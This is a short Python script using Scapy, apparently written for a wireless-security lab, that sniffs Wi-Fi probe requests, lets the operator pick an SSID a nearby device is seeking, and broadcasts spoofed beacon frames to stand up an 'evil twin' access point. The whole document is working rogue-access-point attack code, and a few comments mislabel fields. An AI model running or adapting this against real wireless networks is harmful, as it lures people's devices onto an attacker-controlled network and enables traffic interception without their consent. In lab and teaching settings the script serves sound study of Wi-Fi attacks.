# Authors : Delphine Scherler & Wenes Limem
# Date : 31.03.2022
# Description : Script qui permet la création d'un evil twin pour viser une cible que l'on découvre dynamiquement en
# utilisant des probes


from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11ProbeReq

probes = {}


# find all probes
def find_probes(pkt):
    if pkt.haslayer(Dot11ProbeReq):
        # extract the MAC address of the network
        essid = pkt[Dot11Elt].info
        # get the name of it
        ssid = pkt[Dot11Elt].info.decode()
        # extract address of the STA
        source = pkt[Dot11].addr2
        # extract network stats
        stats = pkt[Dot11ProbeReq].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        # add probe to the list
        if essid not in probes:
            probes[essid] = [essid, ssid, channel]


# method to generate beacon
def generate_beacon(iface, ssid):
    sender_MAC = RandMAC()
    # 802.11 frame
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_MAC, addr3=sender_MAC)
    bc = Dot11Beacon(cap="ESS+privacy")
    channel = Dot11Elt(ID="DSset", info=chr(6))
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    pkt = RadioTap() / dot11 / bc / essid / channel
    sendp(pkt, iface=iface, loop=2, inter=0.2)


if __name__ == "__main__":
    # fixing interface and timeout
    interface = "wlan0"
    t_out = input("Sniffing timeout: ")

    sniff(prn=find_probes, iface=interface, timeout=int(t_out))
    ssids = []
    # display all probes
    print("probes scanned:")
    cnt = 0
    for i in probes:
        cnt += 1
        ssids.append(probes.get(i)[0])
        print(cnt, probes.get(i))

    # user select target network
    tg_index = int(input("Tapez le numero de la cible : "))
    tg_ssid = ssids[int(tg_index - 1)]

    # evil twin is generated
    generate_beacon(interface, tg_ssid)
